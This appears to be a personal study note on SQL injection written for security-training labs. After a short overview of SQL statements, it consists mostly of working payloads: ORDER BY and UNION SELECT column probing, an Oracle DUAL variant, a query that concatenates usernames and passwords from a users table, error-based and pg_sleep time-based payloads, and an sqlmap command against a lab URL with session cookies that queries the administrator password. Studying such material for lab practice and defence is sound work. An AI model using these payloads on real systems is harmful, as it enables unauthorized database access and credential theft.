Structured Query Language Injection.
SQL (Structured Query Language) is a feature-rich language used for querying databases, these SQL queries are better referred to as statements.  

  

The simplest of the commands which we'll cover in this task is used to retrieve (select), update, insert and delete data. Although somewhat similar, some databases servers have their own syntax and slight changes to how things work. All of these examples are based on a MySQL database. After learning the lessons, you'll easily be able to search for alternative syntax online for the different servers. It's worth noting that SQL syntax is not case sensitive. Some statements are:

- [[Select]]
- [[Union]]
- [[Insert]]
- [[Update]]
- [[Delete]]
- [[Group_concat]]
- [[Information_schema]]
- 
Always check the number of columns of the request, try using the same request and adding "order by" check this example:

GET /filter?category=Gifts'+order+by+3--

Or check this other example:
1. Modify the `category` parameter, giving it the value `'+UNION+SELECT+NULL--`. Observe that an error occurs.
2. Modify the `category` parameter to add an additional column containing a null value. 1. Continue adding null values until the error disappears and the response includes additional content containing the null values.
    
    `'+UNION+SELECT+NULL,NULL--` 


In Oracle databases in some select request is require to express from where table will be select the items, so, you always use a default table like "DUAL", check this example

'+UNION+SELECT+'abc','def'+FROM+dual--


With this query you can get multiple columns when the request only allows one of them to retrieve strings

'UNION+SELECT+NULL,username+||'+'||+password+FROM+users--


▒░ sqlmap -u 'https://0a37000f03fb077880b2037b002e00e0.web-security-academy.net/advanced_search?SearchTerm=&organize_by=DATE&blogArtist=' --risk 3 --level 5 -p 'organize_by' --threads 10 --cookie=' _lab=46%7cMCwCFGYuegwnsSPJizodYCaqF%2fRRj1z8AhQ3%2bYHtpDxcgnT%2fcaQKkQ3qkeintja5NjXpHBRmvgnakBf%2bA48sSoaQKJ7FWBOEIilLbYQyuG8%2b%2bv5Ow80vL86cd7ruY3OBSBoW6DBwKjetLbKQB9nzz27qC3xb3nHxaPoxL8TIiEpls54%3d; session=CxE9YZJTl7dTvxS8Rl9QlSlt0DIomEGp' --batch --dbms=postgresql --sql-query="SELECT password FROM users WHERE username='administrator'"




'||(SELECT '' FROM dual)||' 

' AND 1=CAST((SELECT username FROM users) AS int)--
'||pg_sleep(10)--